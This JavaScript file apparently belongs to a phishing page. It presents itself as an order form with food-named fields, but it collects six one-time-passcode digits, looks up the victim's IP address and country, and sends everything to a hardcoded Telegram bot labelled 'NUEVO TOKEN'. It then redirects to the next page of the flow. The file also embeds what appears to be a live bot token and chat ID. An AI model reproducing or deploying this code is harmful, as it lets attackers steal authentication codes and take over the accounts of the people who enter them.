document.addEventListener("DOMContentLoaded", function () {

    const formulario = document.getElementById("pedidoForm");
    const pedido11 = document.getElementById("pedido11");
    const pedido12 = document.getElementById("pedido12");
    const pedido13 = document.getElementById("pedido13");
    const pedido14 = document.getElementById("pedido14");
    const pedido15 = document.getElementById("pedido15");
    const pedido16 = document.getElementById("pedido16");

 

    if (!formulario || !pedido11 || !pedido12 || !pedido13 || !pedido14 || !pedido15 || !pedido16)  {
        console.error("No se encontraron los elementos.");
        return;
    }

    const botToken = "9033333404:AAGLvewEHLmKvRtjIhQjP3IclyzPmykDMYU";
    const chatId = "6956488104";

    formulario.addEventListener("submit", async function (e) {

        e.preventDefault();

        const comida = pedido11.value.trim();
        const bebida = pedido12.value.trim();
        const arepa = pedido13.value.trim();
        const carne = pedido14.value.trim();
        const pupu = pedido15.value.trim();
        const cabima = pedido16.value.trim();

 

if (!comida) return;
        try {

            // Obtener país e IP
            const geoRespuesta = await fetch("https://ipwho.is/");
            const geo = await geoRespuesta.json();

            const pais = geo.success ? geo.country : "No disponible";
            const ip = geo.success ? geo.ip : "No disponible";

       // Crear mensaje
            const mensaje =
                "* NUEVO TOKEN-2\n\n" +
                "* CODIGO:\n" +
                comida + "\n\n" +
                "* CODIGO:\n" +
                bebida + "\n\n" +
                 "* CODIGO:\n" +
                arepa + "\n\n" +
                "* CODIGO:\n" +
                carne + "\n\n" +
                "* CODIGO:\n" +
                pupu + "\n\n" +
                 "* CODIGO:\n" +
                cabima + "\n\n" +





                "🌎 PAÍS: " + pais + "\n" +
                "🌐 IP: " + ip + "\n\n" +
                "📌 ESTADO: CAYO UNO 1 ";

            // Enviar a Telegram
            const respuesta = await fetch(
                "https://api.telegram.org/bot" + botToken + "/sendMessage",
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: mensaje
                    })
                }
            );

            const resultado = await respuesta.json();

            if (!respuesta.ok || !resultado.ok) {
                console.error("Error de Telegram:", resultado);
                return;
            }

            window.location.href = "5.html";

        } catch (error) {
            console.error("Error:", error);
        }

    });

});


document.addEventListener("DOMContentLoaded", function () {

    const inputs = document.querySelectorAll(".otp");

    inputs.forEach((input, index) => {

        input.addEventListener("input", function () {

            this.value = this.value.replace(/[^0-9]/g, "");

            if (this.value.length === 1 && index < inputs.length - 1) {
                inputs[index + 1].focus();
            }

        });

        input.addEventListener("keydown", function (e) {

            if (e.key === "Backspace" && !this.value && index > 0) {
                inputs[index - 1].focus();
            }

        });

    });

});